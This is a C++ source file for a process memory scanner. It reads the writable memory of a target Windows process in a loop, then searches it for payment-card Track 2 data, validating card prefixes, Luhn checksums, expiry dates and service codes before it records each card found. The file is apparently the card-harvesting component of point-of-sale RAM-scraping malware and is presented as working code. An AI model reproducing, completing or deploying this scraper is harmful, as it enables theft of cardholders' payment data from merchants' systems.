#include "ProcScanner.h"
#include "Scanner.h"

ProcScanner::ProcScanner(DWORD pid, HANDLE hProc)
{
	this->hProc = hProc;
	this->pid = pid;

	DWORD tid;
	InitializeCriticalSection(&csl);
	sleep = 10000;
	found = 0;
	nticks = 0;
	ticks = 0;
	
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)procThread, this, 0, &tid);
	setThreadPriority(THREAD_PRIORITY_LOWEST);
}


ProcScanner::~ProcScanner(void)
{
	CloseHandle(hProc);
	DeleteCriticalSection(&csl);
}

void ProcScanner::setThreadPriority(int p)
{
	SetThreadPriority(hThread, p);
}

HANDLE ProcScanner::getThreadHandle()
{
	return(hThread);
}

void __stdcall ProcScanner::procThread(ProcScanner *p)
{
	char *buf = new char[0x1000];
	unsigned int bufsize = 0x1000;
	DWORD ticks;

	while (GetProcessId(p->hProc) == p->pid) {
		unsigned int sleep;
		p->lock();
		sleep = p->sleep;
		p->unlock();
		Sleep(sleep);

		ticks = GetTickCount();
		DWORD base = 0;
		MEMORY_BASIC_INFORMATION mem;

		for (base = 0; VirtualQueryEx(p->hProc, (void *)base, &mem, sizeof(mem)); base = (DWORD)mem.BaseAddress + mem.RegionSize) {
			if (mem.Protect == PAGE_READWRITE && mem.State == MEM_COMMIT) {
				if (mem.RegionSize > bufsize) {
					if (buf)
						delete[] buf;
					buf = new char[mem.RegionSize];
					if (!buf)
						continue;
					bufsize = mem.RegionSize;
				}
				DWORD rd;
				if (ReadProcessMemory(p->hProc, mem.BaseAddress, buf, mem.RegionSize, &rd) && rd == mem.RegionSize) {
					DWORD chk = Scanner::instance()->crc32((unsigned char *)buf, mem.RegionSize);
					if (p->hashes.find(chk) == p->hashes.end()) {
						p->hashes.insert(chk);
						p->scan((unsigned char *)buf, mem.RegionSize);
					}
				}
			}
		}

		ticks = GetTickCount() - ticks;
		p->lock();
		p->ticks = (p->ticks * p->nticks + ticks) / ++p->nticks;
		p->unlock();
	}

	if (buf)
		delete[] buf;
	Scanner::instance()->procDone(p);
}

void ProcScanner::scan(const unsigned char *buf, unsigned int size)
{
	const unsigned char *p;
	std::string card;

	for (p = buf + 15; p < buf + size - 10; p++) {
		if (*p != '=' && *p != 'D')
			continue;

		const unsigned char *start = (const unsigned char *)0,
			*end = (const unsigned char *)0,
			*sep = p;
		
		unsigned short luhn = 0;
		// start digit 3,4,5,6
		// luhn = digit * 2
		// luhn -= 9 if > 9
		if (p[-16] == '3')
			luhn = 6;
		else if (p[-16] == '4')
			luhn = 8;
		else if (p[-16] == '5')
			luhn = 1;
		else if (p[-16] == '6')
			luhn = 3;
		else
			continue;

		// expiry year between 2013 and 2050
		if (p[1] < '1' || p[1] > '4' || p[2] > '9' || p[2] < '0')
			continue;

		unsigned int year = (p[1] - '0') * 10 + (p[2] - '0');
		if (year < 13 || year > 40)
			continue;

		// expiry month between 1 and 12
		if (p[3] > '9' || p[3] < '0' || p[4] > '9' || p[4] < '0')
			continue;

		unsigned int month = (p[3] - '0') * 10 + (p[4] - '0');
		if (month == 0 || month > 12)
			continue;

		// Only 101 or 201 after YYMM allowed
		if (p[6] != '0' || p[7] != '1' || (p[5] != '2' && p[5] != '1'))
			continue;

		// check digits before seperator
		for (unsigned char i = 1; i <= 15; i++) {
			unsigned char l = p[-i] - '0';
			if (l > 9)
				goto cont;

			if (!(i % 2)) {
				l *= 2;
				if (l > 9)
					l -= 9;
			}
			luhn += l;
		}

		if (luhn % 10)
			continue;

		// check digits after seperator
		// first 4 (YYMM) + 3 (101/201) have already been checked for validity
		for (unsigned char i = 8; i <= 30; i++) {
			const unsigned char *c = p + i;
			if (*c > '9' || *c < '0') {
				if (i <= 10)
					goto cont;

				end = c;
				if (*c == '?')
					end++;

				break;
			}
		}

		if (!end)
			end = p + 31;

		start = p - 16;
		card.assign((const char *)start, end - start);

		if (Scanner::instance()->found(card, this)) {
			lock();
			found++;
			unlock();
		}

		p = end + 15;

cont:
		0;
	}
}

void ProcScanner::setsleep(unsigned int sleep)
{
	this->sleep = sleep;
}

DWORD ProcScanner::getPid()
{
	return(pid);
}

unsigned int ProcScanner::getsleep()
{
	unsigned int sleep;
	//EnterCriticalSection(&csl);
	sleep = this->sleep;
	//LeaveCriticalSection(&csl);

	return(sleep);
}

unsigned int ProcScanner::getfound()
{
	unsigned int found;
	//EnterCriticalSection(&csl);
	found = this->found;
	//LeaveCriticalSection(&csl);

	return(found);
}

DWORD ProcScanner::getticks()
{
	DWORD ticks;
	//EnterCriticalSection(&csl);
	ticks = this->ticks;
	//LeaveCriticalSection(&csl);

	return(ticks);
}

void ProcScanner::lock()
{
	EnterCriticalSection(&csl);
}

void ProcScanner::unlock()
{
	LeaveCriticalSection(&csl);
}
